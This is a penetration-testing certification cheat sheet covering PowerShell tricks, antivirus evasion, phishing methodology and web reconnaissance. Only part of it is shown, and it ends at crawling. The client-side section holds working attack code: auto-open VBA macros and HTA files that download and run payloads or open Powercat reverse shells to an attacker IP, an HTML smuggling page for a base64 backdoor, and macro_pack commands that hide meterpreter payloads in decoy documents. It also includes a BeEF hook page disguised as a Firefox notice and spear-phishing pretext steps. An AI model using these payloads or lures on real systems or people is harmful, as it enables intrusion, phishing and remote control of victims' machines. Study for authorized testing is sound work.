# eCPPT-CheatSheet

## Table of Contents
- [PowerShell](#powershell)
  - [Shelter (AV Evasion)](#shelter-av-evasion)
  - [Invoke-Obfuscation](#invoke-obfuscation)
- [Client-Side Attacks](#client-side-attacks)
  - [msfvenom](#msfvenom)
  - [VBA Macros X Powercat](#vba-macros-x-powercat)
  	- [Powercat](#powercat)
  	- [Macro Pack](#macro-pack)
  	- [Other Client-Side Attacks Framework](#other-client-side-attacks-framework)
- [Web App PT](#web-app-pt)
  - [Passive info gathering](#passive-info-gathering)
  	- [Whois](#whois)
    - [NetsCraft](#netcraft)
    - [dnsrecon x dnsdumpster x dnsenum](#dnsrecon-x-dnsdumpster-dnsenum)
	- [Website/App Tech Fingerprinting](#websiteapp-tech-fingerprinting)
- [Crawling & Spidering](#crawling--spidering)
	- [OWASP ZAP - (SQLi & Spidering)](#owasp-zap---sqli--spidering)
- [SQLi](#sqli)
  	- [SQLMap](#sqlmap)
- [Nikto](#nikto)
- [Gobuster](#gobuster)
- [Amass - Automating Web Enum](#amass---automating-web-enum)
- [WPScan](#wpscan)
- [MyBBScan](#mybbscan)
- [Network PT](#network-pt)
	- [Netstat](#netstat)
	- [Host Discovery](#host-discovery)
	- [Nmap](#nmap)
- [Windows Enumeration](#windows-enumeration)
	- [SMB & NetBIOS Enumeration](#smb--netbios-enumeration)
	- [SNMP Enumeration](#snmp-enumeration)
- [Linux Enumeration](#linux-enumeration)
- [Windows Exploitation](#windows-exploitation)
  - [Windows Exploitation AV Evasion](#windows-exploitation-av-evasion)
	- [SMB Relay Attack (Heavy use with LDAP in AD)](#smb-relay-attack-heavy-use-with-ldap-in-ad)
	- [MSSQL DB Attacks](#mssql-db-attacks)
- [Linux Exploitation](#linux-exploitation)
- [Linux-Post Exploitation](#linux-post-exploitation)
- [Windows-Post Exploitation](#windows-post-exploitation)
- [System Security & Assembly](#system-security--assembly)
	- [Brief about Assembly](#brief-about-assembly)
	- [Setting Up The Lab](#setting-up-the-lab)
		- [Fuzzer with Spike](#fuzzer-with-spike)
		- [Windows Buffer Overflow](#windows-buffer-overflow)
- [Privilege Escalation](#privilege-escalation)
  - [Scripts](#Scripts- (Migrate-to-more-stable process-before-script-execution,-to-access-memory-info,-for-more-verbosity.-TO-NOT-LOSE-EASY-PRIVESC-CHANCES!!))
  - [Windows Privilege Escalation](#windows-privilege-escalation)
  	- [Locally Stored Creds](#locally-stored-creds)
  	- [Service Exploits](#service-exploits)
  	- [Registry AutoRun](#registry-autorun)
  	- [Impersonation Attacks](#impersonation-attacks)
  	- [Other Advanced Techniques](#other-advanced-techniques)
- [Linux Privilege Escalation](#linux-privilege-escalation)
- [Lateral Mov & Pivoting](#lateral-mov--pivoting)
- [Windows Lateral Movement](#windows-lateral-movement)
  - [PsExec](#psexec)
  - [SMBExec](#smbexec)
  - [CrackMapExec (CME)](#crackmapexec-cme)
  - [RDP](#rdp)
  - [WinRM](#winrm)
- [Pass-The-Hash Attack](#pass-the-hash-attack)
	- [WMIExec](#wmiexec)
- [Linux Lateral Movement](#linux-lateral-movement)
- [Pivoting](#pivoting)
- [AD PT](#ad-pt)
	- [Methodology of AD PT](#methodology-of-ad-pt)
	- [PowerShell x AD](#powershell-x-ad)
	- [PowerView-ADEnumeration](#powerview-adenumeration)
	- [AD Enumeration](#ad-enumeration)
		- [Password Spraying](#password-spraying)
		- [BloodHound](#bloodhound)
	- [AD Privilege Escalation](#ad-privilege-escalation)
  		- [AS-REP Roasting (NPU)](#as-rep-roasting-npu)
  		- [Kerberoasting (SPN)](#kerberoasting-spn)
  		- [DCSync](#dcsync)
	- [AD Lateral Movement](#ad-lateral-movement)
  		- [PtH](#pth)
  		- [PtT - Pass-The-Ticket](#ptt---pass-the-ticket)
	- [AD Persistence - Golden & Silver Tickets](#ad-persistence---golden--silver-tickets)
  		- [Silver Ticket](#silver-ticket)
  		- [Golden Ticket](#golden-ticket)
  		- [DCSync](#dcsync-1)
- [C2/C&C](#c2cc)
	- [C2 Matrix](#c2-matrix)
	- [PowerShell-Empire](#powershell-empire)
	- [Basic Process of PowerShell Empire CLI...](#basic-process-of-powershell-empire-cli-exploitation-&-post-exploitation-process)

# PowerShell

[https://lolbas-project.github.io/](https://lolbas-project.github.io/)

[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

- Detecting if its 64-bit or 32-bit:
    
    ```powershell
    [Environment]::Is64BitProcess
    # If true? its 64-bit process
    ```
    
- help:
    
    ```powershell
    powershell /?
    ```
    
- Edit scripts execution Policy using Bypass or Unrestricted arguments (Run with the Execution Policy or can be sat globally):
    
    ```powershell
    powershell.exe  -ExecutionPolicy Bypass .\script.ps1
    # OR
    -ep Bypass
    # OR
    -ex by
    ```
    
    ```powershell
    powershell.exe  -ExecutionPolicy Unrestricted .\script.ps1
    ```
    
- Hiding the PS CLI to show up when executed (e.g. C2 channels):
    
    ```powershell
    powershell.exe  -WindowStyle Hidden .\script.ps1
    # OR
    -W h
    # OR
    -Wi hi
    ```
    
- Specifying command or Script Block to run
    
    ```powershell
    powershell.exe  -Command Get-Process
    ```
    
    ```powershell
    powershell.exe  -Command Get-Process "& {Get-EventLog -LogName security}"
    ```
    
- Execute base64 encoded scripts or commands
    
    ```powershell
    powershell.exe -EncodedCommand $encodedCommand 
    # OR
    -enco
    # OR
    -ec
    ```
    
- Don’t load profile
    
    ```powershell
    powershell.exe -NoProfile .\script.ps1
    ```
    
- Downgrade the version
    
    ```powershell
    version 2
    ```
    
- “GET-HELP” <cmdlet> → similar to man
    
    ```powershell
    GET-HELP GET-HELP
    GET-HELP <Any CMDLet>
    # OR
    GET-HELP GET-Process -Full
    # OR
    GET-HELP GET-process -Online
    
    # For updating...
    Update-Help
    # Loops
    Get-Help about_Foreach
    Get-Help about_For
    Get-Help about_Do
    Get-Help about_While
    ```
    
- Loops
    
    ```powershell
    $services = Get-Service
    foreach ($service in $services) {$service.Name}
    # OR
    Get-Service | ForEach-Object {$_.Name}
    ```
    
- Where-Object x Get-ChildItem(dir)
    
    ```powershell
    > Get-ChildItem C:\Users\shady\Desktop | Where-Object {$_.Name -match "ps1"}
    
        Directory: C:\Users\shady\Desktop
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----         3/19/2025     19:59           3925 IDS.ps1
    ```
    
- Listing all cmdlets, aliases, functions, workflows, filters, scripts and any application available to use in PS
    
    ```powershell
    Get-Command -Name *Firewall* # -Name similar to "grep"
    # With no arguments.. will list it all
    Get-Command
    ```
    
- Pipelining x Saving to textFile
    
    ```powershell
    GET-Process | Sort-Object -Unique | Select-Object ProcessName > output.txt
    ```
    
- List process path
    
    ```powershell
    Get-Process Steam| Sort-Object -Unique |Format-List path 
    ```
    
- List process based on Member
    
    ```powershell
    Get-Process | Get-Member -MemberType Method
    ```
    
- Process killing
    
    ```powershell
    Get-Process -Name "Firefox" | kill
    ```
    
- Get-Alias. Get the aliases for a specific another Cmdlet
    
    ```powershell
    Get-Alias -Definition Get-Childreen 
    # Get-Childreen is an exmple
    ```
    
- GET-WmiObject. Windows Management Instrumentation (Juicy Staff )
    
    ```powershell
    Get-WmiObject -class Win32_OperatingSystem | select -Property *
    ```
    
    - Select-Object
        
        ```powershell
        Get-WmiObject -class Win32_OperatingSystem | select -Property * | Select-Object version
        ```
        
    - Also, “fl *” and “Format-List *”
        - or .. “fl <an Object>”
- Get-Service with Sort Object
    
    ```powershell
    Get-Service "x" | Sort-Object 
    ```
    
- New Folder
    
    ```powershell
    New-Item x -ItemType Directory
    ```
    
- To create a module → `“New-Module”` Cmdlet
- Modules imported to PS session by `“Get-Module”` cmdlet
    - Can also list them using `“-ListAvailable”`
    - and to import `“Import-Module .\module.psm1”`
- Importing [https://github.com/PowerShellMafia/PowerSploit/archive/master.zip](https://github.com/PowerShellMafia/PowerSploit/archive/master.zip) Module .. PowerSploit.
    
    ```powershell
    PS C:\Windows\system32> $Env:PSModulePath
    C:\Users\shady\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    
    PS C:\Windows\system32> cd C:\Users\shady\Documents\WindowsPowerShell\Modules\
    PS C:\Users\shady\Documents\WindowsPowerShell\Modules> New-Item PowerSploit -ItemType Directory
    
        Directory: C:\Users\shady\Documents\WindowsPowerShell\Modules
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----         5/31/2025     05:12                PowerSploit
    
    PS C:\Users\shady\Documents\WindowsPowerShell\Modules> cd .\PowerSploit\
    PS C:\Users\shady\Documents\WindowsPowerShell\Modules\PowerSploit>
    
    # Move and extract master.zip in PowerSploit dir
    
    PS C:\Users\shady\Documents\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit
    PS C:\Users\shady\Documents\WindowsPowerShell\Modules\PowerSploit> Get-Module
    PS C:\Users\shady\Documents\WindowsPowerShell\Modules\PowerSploit> Get-Command -Module PowerSploit
    # You can use Get-Help also with PowerSploit Commands
    
    ```
    
- View content (cat)
    
    ```powershell
    Get-Content <file>
    ```
    
- Creating Objects → New-Object
    - ProgID or a COM object OR .NET Object
    
    ```powershell
    $webclient = New-Object System.Net.Webclient # <- .NET Object
    $payload_url = "https://attacker_host/payload.exe"
    $file = "C:\programData\payload.exe"
    $webclient.DownloadFile($payload_url,$file)
    ```
    
    - Like these small codes .. can turn into scripts then make it hidden and change execution policy ..etc (dropper.ps1)
- TCP Port Scanner Script
    
    ```powershell
    # PortScanner.ps1
    # Simple TCP port scanner script in PowerShell
    
    # Define the IP address and ports to scan
    $ip = "192.168.100.11"
    $ports = @(80, 443)
    
    Write-Host "Starting scan on $ip..." -ForegroundColor Cyan
    
    foreach ($port in $ports) {
        try {
            # Create a new TCP client and attempt to connect
            $socket = New-Object System.Net.Sockets.TcpClient
            $socket.Connect($ip, $port)
    
            if ($socket.Connected) {
                Write-Host "$ip`:$port - Open" -ForegroundColor Green
                $socket.Close()
            } else {
                Write-Host "$ip`:$port - Closed" -ForegroundColor Red
            }
        }
        catch {
            # If connection throws an exception, port is considered closed
            Write-Host "$ip`:$port - Closed" -ForegroundColor Red
        }
    }
    
    Write-Host "Scan complete." -ForegroundColor Cyan
    
    # one Line
    $ports = @(80,443); $ip="192.168.100.11"; foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port)} catch{}; if ($socket -eq $null -or !$socket.Connected) {echo "$ip`:$port - Closed"} else {echo "$ip`:$port - Open"; $socket.Close()}}
    
    ```
    

## Shelter (AV Evasion)

```bash
sudo apt install shellter -y
# its windows Executeble -> Need Wine
sudo dpkg -add-architecture i386
sudo apt install wine32
# -
cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
# Executables find in "/usr/share/windows-binaries"

```

- Compatible with Metasploit
- Needs a real executable to inject your code in it (Simple executable)
- Injection Process:
    1. Auto
    2. PE Target→ ‘path for the actual executable’
    3. Stealth Mode→ Y, enable. Why?; To make the executable functions normally, while shellcode executed in background
    4. Stager→ Listed payload
    5. Original Executable after injecting will stored under “/usr/share/windows-resources/shellter”
    6. The malicious one, is the same as the one in PE path, changed to the malicious one 
    7. Setup a listener and whenever the target execute the malicious code you shall get a shell. Make sure to match the payload, LHOST, and LPORT

## Invoke-Obfuscation

- PowerShell Obfuscator

[https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

- Needs powershell in linux to use it
- Setup:
    
    ```bash
    sudo apt instal powershell
    # Clone Invoke-Obfuscation
    pwsh
    cd ./Invoke-Obfuscation/
    Import-Module ./Invoke-Obfuscation.psd1 
    cd .. 
    Invoke-Obfuscation
    ```
    
- After finish setup process. Obfuscation Process:
    1. Make sure your code without “powershell -nop -c” then save it as “*.ps1”
    2. SET SCRIPTPATH path/*.ps1
    3. AST .. there are many, but mostly AST is better
    4. ALL
    5. 1
    6. Code ready
    - Note: Mostly you need to hit Enter to get the PS session

# Client-Side Attacks

![image.png](eCPPT-CheatSheet%2020164f6a487d80b4be37fd2315287b6e/image.png)

- Steps of Client-Side Attack:
    1. Reconnaissance:
        1. OSINT
        2. Identify employees, roles, and potential targets within the organization 
        3. Gather info about the technology of the corp stack, email domains, and common software application used by employees
    2. Target Identification: 
        1. Identifies specific individuals (Who would have access to sensitive info?)
        2. Select the target. (HR, Finance, Executives.)
    3. Payload Development
        1. Word with macro or a PDF with JS exploit .. etc.
        2. Payload shall exploits an app
    4. Payload Preparation:
        1. Pretexting or craft a phishing email as important document
        2. Set up infrastructure to host the malicious document or payload, such as compromised website or temp file sharing service.
    5. Payload Delivery:
        1. Send phishing emails
        2. Urgent, Fear, Curiosity 
    6. Payload Execution:
        1. Target execute the payload 
        2. gain initial foothold and C&C C2 
    7. Post-Exploitation:
        1. Lateral Movement, Priv Esc, Data Exfiltration, 
    
    ---
    
- **OSINT**
    - Social Media
    - Public forums, websites related to the corp
    - Tools:
        - Google Dorks
        - Maltego → Link Analysis
        - TheHarvester → Email Harvesting
    - Search Engine Reconnaissance:
        - Advance search queries and operators
        - Shodan
        - DuckDuckGo
- **Client Fingerprinting**
    - Adversaries first step
    - Techniques to gather info about a user’s web browser and software/App/OS stack. (How to develop a payload without knowing what is the OS? Apps?.. etc. (STOP SHOOTING IN THE SHADOW!) Browser version? OS Architecture? What Software installed?
- **Social Engineering**
    - Engaging with individuals through phone calls, emails, or any communication method to gather sensitive info, creds, access permissions or identify what software is running
    - Tools:
        - SET
        - PhishMe
        - BeEF (Browser Exploitation Framework)
    - Being natural as possible
    - Steps (Identify Versions):
        1. Research and Preparation → Reconnaissance (Job Upload)
        2. Initiating Contact → Make an action based on your Reconnaissance phase (Upload corrupted document to identify software)
        3. Response from the company →  Company: “its not working!”
        4. Exploitation → Let me know what is your version of MS office? etc.
        5. Info Gathering → MS Word version
        6. Analysis & Resource Development → Version may be vulnerable or send another document with payload embedded compatible with the version 
- Browser Fingerprinting (Client Fingerprinting)
    - JS Library
        
        [https://github.com/LukasDrgon/fingerprintjs2](https://github.com/LukasDrgon/fingerprintjs2)
        
        - Setup:
            1. Setup a web server 
                
                ```bash
                sudo apt install apache2
                sudo systemctl start apache2
                # Website in /var/www/html
                ```
                
            2. Leveraging FPJS2 home page
                
                ```bash
                cd /var/www/html
                sudo git clone */fingerprintjs2.git
                ```
                
            3. Navigate siteIP/fingerprintjs2.. 
                1. What info we get?
                    1. User-Agent 
                        1. [**https://explore.whatismybrowser.com/useragents/parse/](https://explore.whatismybrowser.com/useragents/parse/)** 
                    2. Browser 
                    3. OS
                    4. Browser Version
                    5. Language used
                    6. Plugins
                    7. Adblock on or off
                    8. Screen resolution 
                    9. Navigator Platform
                    10. Touch Support
                    11. Architecture 
            4. How to make it more realistic use?
                
                ```bash
                cd /var/www/html/fingerprintjs2
                sudo nano index.html 
                # Change it to make it more convincing
                	# remove suspiciousincy, use AI tools	
                ```
                
                - Remove HTML and break tags  from timestring, details
                - Instead of b \> make it \n ← in the script
                - Make a PHP script under the script to save the data
                    
                    ```php
                           // $("#details").html(details);
                            $("#fp").text(result);
                            $("#time").text(timeString);
                            var xmlhttp = new XMLHttpRequest();
                    xmlhttp.open("POST", "fp.php");
                    xmlhttp.setRequestHeader("Content-Type", "text/plain");
                    xmlhttp.send(details + result + timeString);
                    
                    ```
                    
                    - make a file fp.php in the same directory and write these
                        
                        ```php
                        <?php
                        $data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
                        $data .= file_get_contents('php://input'); 
                        $data .= "--------------------------\n\n";
                        file_put_contents('/var/www/html/fingerprintjs2/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
                        ?>
                        
                        ```
                        
                        ```bash
                        sudo chown www-data:www-data /var/www/html/fingerprintjs2
                        sudo systemctl restart apache2
                        ```
                        
- Phishing vs Spear Phishing
    - **Generic** attack vs Targeted Attack
    - Spray and Pray vs Sniper Shot
    - Spear:
        - Specific not wide
        - Highly personalized and customized in order to exploit unique characteristics, interests, and relationships
    - Phishing Steps:
        1. Planning & Reconnaissance → Communication
        2. Message Crafting → Deceiving 
        3. Delivery → Spear or generic
        4. Deception & Manipulation → Malicious. The wrong click
        5. Exploitation
    - Spear-Phishing Steps:
        1. Target Selection and Research: 
            1. Carefully selected. 
            2. Info must gathered:
                1. Job role
                2. Department 
                3. Hierarchies
                4. Name
                5. Responsibilities 
                6. Relationships  
                7. Public sources
                8. Social Media
                9. Leaked data
        2. Message Tailoring
            1. Craft trustworthy message 
            2. Events, Projects, or activities relevant.
            3. Impersonation (colleagues, supervisors, external partners)
        3. Delivery
            1. Email, Social Media
            2. Employ tactics to bypass anti-phishing mechanisms such using spoofed email account, exploiting zero-day vulns or leveraging trusted third-party services
- Characteristics of Pretexting:
    - False Pretense
        - Trustworthy fictional story that may include impersonation
    - Establishing Trust
        - Mirroring tone and behavior
    - Manipulation Emotions
        - Human emotions.. Fear, Urgency, Sympathy, Curiosity, Emergency, or Need for approval
    - Information Gathering
        - Requesting info by posing and sneaking question related pre the request maybe as natural curiosity
    - Maintaining Consistency
        - Keep up to maintain the illusion of legitimacy and remaining consistent  throughout the interaction
    
    All these need careful planning, research and improvisation
    
    [https://github.com/L4bF0x/PhishingPretexts/](https://github.com/L4bF0x/PhishingPretexts/)
    

---

- GoPhish
- Cyber Kill Chain: linear model of an attack lifecycle
    - **Reconnaissance** – Info gathering
    - **Weaponization** – Package payload
    - **Delivery** – Send to victim (email, USB, etc.)
    - **Exploitation** – Trigger the payload
    - **Installation** – Malware installation on asset
    - **C2 (Command & Control)** – Remote access
    - **Actions on Objectives** – Exfil, lateral move, keylogger etc.

| **Aspect** | **Resource Development** | **Weaponization** |
| --- | --- | --- |
| **Focus** | Acquiring necessary tools, knowledge, and capabilities | Turning resources into active attack payloads or techniques |
| **Stage in Lifecycle** | Occurs **before** weaponization in the attack lifecycle | Follows resource development to prepare for attack deployment |
| **Nature of Activities** | Research, reconnaissance, tool/infrastructure creation | Crafting malicious files, building/configuring payloads, exploit preparation |
| **Output** | Tools, infrastructure, and knowledge about the target environment | Ready-to-use attack payloads or delivery mechanisms |

Reconnaissance (Gather info) → Resource Development (What to prepare) → Weaponization (Prepare) → Delivery (The medium)

---

## msfvenom

```bash
msfvenom -a --platform -p LHOST= LPORT= -f
```

- Encoding the payload for File Smuggling:
    - Medium might be a Website or an Email.
    
    ```powershell
    base64 -w0 backdoor.exe > backdoor.txt
    ```
    
    - index.html
        
        ```html
        <html>
        <body>
        <script>
        function base64ToArrayBuffer(base64) {
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array( len );
        for (var i = 0; i < len; i++) { bytes[i] =
        binary_string.charCodeAt(i);
        }
        return bytes.buffer;
        }
        var file ='<backdoor.exe Base64 Encoded Value>'
        var data = base64ToArrayBuffer(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'msfstaged.exe';
        var a = document.createElement('a');
        document.body.appendChild(a);
        a.style = 'display: none';
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
        </script>
        </body>
        </html>
        ```
        
- Options
    - -f → format
        1. vba → Not recommended, two below is better
            1. vba-exe 
                1. Macro part in macro dev
                2. Payload part in the doc it self
            2. vba-psh
            
            NOTE→ VBA-exe → will give you a written payload (macro). Therefore, no need to output it
            
            NOTE2→ You might need to change “Workbook” to “Document”
            
        2. psh
        3. dll
        4. exe
        5. hta-psh
    - -e → encoder
        1. x86/shikata_ga_nai
    - -a → Architecture
    - —platform
        - Windows
        - Linux
    - -p → Payloads
        - Linux
        - Windows
        - http
- to list → —lists

## VBA Macros X Powercat

- Testing phase
    1. Trust VBA check under trust
    2. Check “Show Message Bar” under trust
    3. Check developer check in ribbon
    4. Always link your macro with the specified document not in all active templates!
    5. It is not recommenede to save as “Word Macro-Enabled Doc” → It tells the user its macro enabled
- Syntax:
    - Sub → Sub Routines
    - ‘ → Comments
    - Functions:
        1. MsgBox (”Message”)
            1. For title → vbinformation, “Title”
    - Var
        - declare→ dim VarName As DataType
        - Assign → Set
    - DataTypes
        - WorkSheet
- Features:
    1. Access Wscript Object Model
    2. Displaying messages
    3. Running External Porgrams
        
        ```visual-basic
        Sub PoC()
           Dim payload As String
           payload = "calc.exe"
           CreateObject("Wscript.shell").Run payload, 0 '1 or 0 no problem
        End Sub
        ```
        
        ```visual-basic
        ' This works with PS and CMD
        Sub PoC()
          Dim wsh As Object
          Set wsh = CreateObject("Wscript.Shell")
          
          wsh.Run "cmd.exe", 1, False
        End Sub
        ```
        
        - 0 → , 1 → Bring it up , 2→ in tabs , 3→ Maximize, 4→Most Recent
        - For “.dotm”
            
            ```visual-basic
            Sub Document_Open()
                PoC
            End Sub
            
            Sub AutoOpen()
                 PoC
            End Sub
            
            Sub PoC()
             Dim payload As String
             payload = "calc.exe"
             CreateObject("Wscript.Shell").Run payload, 0
            
            End Sub
            ```
            
    4. Shell commands
        
        ```visual-basic
        Sub RunWithWScriptShell()
            Dim wsh As Object
            Set wsh = CreateObject("WScript.Shell")
        
            ' Run command silently
            wsh.Run "cmd.exe /c dir C:\ > C:\output.txt", 0, True
        End Sub
        ```
        
        ```visual-basic
        ' OR
        Sub RunShell()
             Shell "cmd.exe /c dir C:\ > C:\output.txt"
        End Sub
        
        ```
        
        1. PowerShell Dropper
            
            ```visual-basic
            Sub AutoOpen()
              dropper
            End Sub
            Sub Document_Open()
               dropper
            End Sub
            Sub dropper()
              Dim url As String
              Dim psScript As String
              url = "http://192.168.100.115:8080/shell.exe"
              
              psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\shady\Desktop\file.exe"";" & vbCrLf & _
                "Start-Process -FilePath ""C:\Users\shady\Desktop\file.exe"""
              
              Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
              
            End Sub
            
            ```
            
    5. Access env var
        1. Reading RegKeys
        
        ```visual-basic
        Sub Document_Open()
           reg
        End Sub
        Sub AutoOpen()
           reg
        End Sub
        Sub reg()
           Dim wsh As Object
           Set wsh = CreateObject("WScript.Shell")
           Dim regKey As String
           regKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
           MsgBox "Product Name: " & wsh.RegRead(regKey & "\ProductName")
        End Sub
        ```
        

### Powercat

[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)

- Can used in File Transfers and Shells
- Listener → nc -nvlp 1337
- Client → powercat -c 192.168.100.115 -p 1337 -e cmd
- Setup for executing in disk (powercat.ps1):
    1. Clone repo
    2. Host a server ⇒ sudo python3 -m http.server 8080.. To transfer powercat.ps1
    3. The Macro:
        
        ```visual-basic
        Sub AutoOpen()
           powercat
        End Sub
        Sub Document_Open()
            powercat
        End Sub
        Sub powercat()
         Dim url As String
         Dim psScript As String
          url = "http://192.168.100.115:8080/powercat.ps1"
          
          psScript = "IEX(New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c 192.168.100.115 -p 1337 -e cmd"
          Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
        End Sub
        ```
        
- Encoded powercat payload setup using attacker machine server (Executed in memory (base64))(Sig-based AV evasion):
    1. Develop the encoded payload
        
        ```bash
        LHOST=IP
        LPORT=port
        pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /tmp/reverse-shell.txt
        ```
        
    2. Host the server in  /tmp ⇒ sudo python3 -m http.server 8080.. To transfer powercat.ps1
    3. Develop the macro (0, false ⇒ Hidden window)
        
        ```vbnet
        Sub AutoOpen()
          powercat
        End Sub
        Sub Document_Open()
          powercat
        End Sub
        Sub powercat()
           Dim Str As String
           Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.100.115:8080/reverse-shell.txt'); iex 'powershell -WindowStyle Hidden -E $code'"""
           CreateObject("Wscript.Shell").Run Str, 0, False
        End Sub
        ```
        

---

- Most used ActiveX Control, and easy to hide..
    - Microsoft InkEdit Control ⇒ automatic
        
        ```vbnet
        Sub InkEdit1_GotFocus()
        End Sub
        ```
        
        - You can even make it call another macro(SubR)
    - Microsoft Forms 2.0 Frame
        
        ```vbnet
        Sub Frame1_Layout()
        End Sub
        ```
        

---

- Pretexting Documents
    
    [https://github.com/martinsohn/Office-phish-templates](https://github.com/martinsohn/Office-phish-templates)
    

---

### hta

- Powercat HTA Reverse Shell
    - In memory in collab with powercat encoded script
        
        ```vbnet
        <html>
        <head>
            <title>HTA Powercat Trigger</title>
            <script language="VBScript">
                Sub powercat()
                    Dim Str
                    Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.100.115:8080/reverse-shell.txt'); iex 'powershell -WindowStyle Hidden -E $code'"""
                    CreateObject("Wscript.Shell").Run Str, 0, False
                End Sub
        
                Sub Window_OnLoad()
                    powercat
                    self.Close
                End Sub
            </script>
        </head>
        <body>
            <h1>HTA Reverse Shell PoC</h1>
        </body>
        </html>
        
        ```
        
    - In Disk
        
        ```vbnet
        <html>
        <head>
            <title>HTA VBScript Run Powercat</title>
            <script language="VBScript">
                Sub Window_OnLoad()
                    Dim url, psScript, command
                    url = "http://192.168.100.115:8080/powercat.ps1"
                    
                    psScript = "IEX(New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c 192.168.100.115 -p 1337 -e cmd"
                    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """"
                    
                    CreateObject("WScript.Shell").Run command, 0, False
                    self.Close
                End Sub
            </script>
        </head>
        <body>
            <h1>HTA Powercat PoC</h1>
        </body>
        </html>
        
        ```
        
- HTA x Macros:
    
    ```vbnet
    Sub AutoOpen()
     executeHTA
    End Sub
    Sub Document_Open()
      executeHTA
    End Sub
    Sub executeHTA()
         Dim url As String
         Dim command As String
         url = "http://192.168.100.115/hta/shell.hta"
         command = "mshta.exe " & url
         Shell command, vbNormalFocus
    End Sub
    ```
    

---

### Macro_Pack

[https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack)

- Windows tool used by Red Teamers, PTs, and SE Assessments
    
    ```powershell
    # Usage: 
    --help
    --listformat
    echo "calc.exe" | .\macro_pack.exe -t CMD -o -G "test.doc"
    	# -o -> Obfuscation
    # Custom Meterpreter Reverse-Shell
    msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=10.100.11.15 -f vba | .\macro_pack.exe -o -G resume.doc
    # ---- Dropper creating
    msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=10.100.11.15 LPORT=5555 -f exe -o update.exe
    python -m http.server 8080
    echo "http://10.100.11.15:8080/update.exe" "update.exe" | .\macro_pack -t DROPPER -o -G "Accounts2024.xls"
    ```
    
- Features:
    - Obfuscation
        - Options:
            1. Renaming functions or vars
            2. Removing spaces or comments
            3. Encoding Strings 
    - AV Evasion
- Formats:
    - MS formats
        - word (doc, docm, docx, dotm)
        - excel (xls, xlsm, xlsx, xltm)
        - PP (pptm, pptx)
        - Access (accdb, mdb)
    - Scripting Formats:
        - vba
        - vbs
        - Windwos Script File → wsf
        - hta
- Templates
    - Reverse Shell
    - PowerShell Reverse Shell
    - Meterpreter

---

### Other Client-Side Attacks Framework

- beef-xss
    - Hook then control
    - Index.html:
    
    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Firefox Restart Required</title>
        <script src="http://10.1.0.15:3000/hook.js"></script>
        <style>
           # Very conviceing style made by GPT
        </style>
    </head>
    <body>
           # Very conviceing style made by GPT
    
    </body>
    </html>
    
    ```
    
- autolt → Windows Scripting Language

# Web App PT

[https://github.com/tanprathan/OWASP-Testing-Checklist](https://github.com/tanprathan/OWASP-Testing-Checklist)

## Passive info gathering

```bash
http-enum,http-shellshock,http-trace,http-title,http-userdir-enum,http-server-header,http-ntlm-info,http-php-version,http-passwd,http-feed,http-fetch,http-headers,http-methods,banner,ssl-enum-ciphers,ssl-heartbleed,http-webdav-scan,banner --script-args http-shellshock.uri=/cgi-bin/,http-methods.uri=/webdav/
```

### whois

[https://whois.domaintools.com/](https://whois.domaintools.com/) → This might give other info “whois-cli” can’t.

```bash
# Identify IP addresses
host <domainName>
# WHOIS Lookup
whois <IP or DomainName>
```

- Help identify
    - domain name
    - domain provider
    - domain registry expiration date
    - Ownership
- Defensive action? → Use DNS Sec and Cloudflare as a proxy and WAF

### NetCraft

[https://sitereport.netcraft.com/](https://sitereport.netcraft.com/)

- Used for fingerprinting

---

### dnsrecon x dnsdumpster x dnsenum

[https://dnsdumpster.com/](https://dnsdumpster.com/)

| Record Type | Meaning | Purpose |
| --- | --- | --- |
| A | Address | Maps domain to IPv4 address |
| AAAA | IPv6 Address | Maps domain to IPv6 address |
| NS | Name Server | Specifies DNS servers for domain |
| MX | Mail Exchange | Specifies mail servers |
| CNAME | Canonical Name | Alias one domain to another |
| TXT | Text | Stores text info (e.g. SPF, verification) |
| HINFO | Host Info | Describes hardware & OS (rarely used) |
| SOA | Start of Authority | Authoritative DNS info and admin |
| SRV | Service | Defines location and port of services |
| PTR | Pointer | Maps IP back to domain (reverse lookup) |

### Website/App Tech Fingerprinting

- Extensions:
    - BuiltWith
        - List WP plugins
        - List frameworks
    - Wappalyzer
- Tools:
    - Whatweb

—

- curl can identify more than nmap scripts only with `curl http<ip>`

## Crawling & Spidering

- Crawling done by Burp (Passive)
- Spidering done by ZAP (Active)
    1. You can change the standard mode to Attack Mode
    2. Tools → Spider → Set Starting Point → Enable recurse

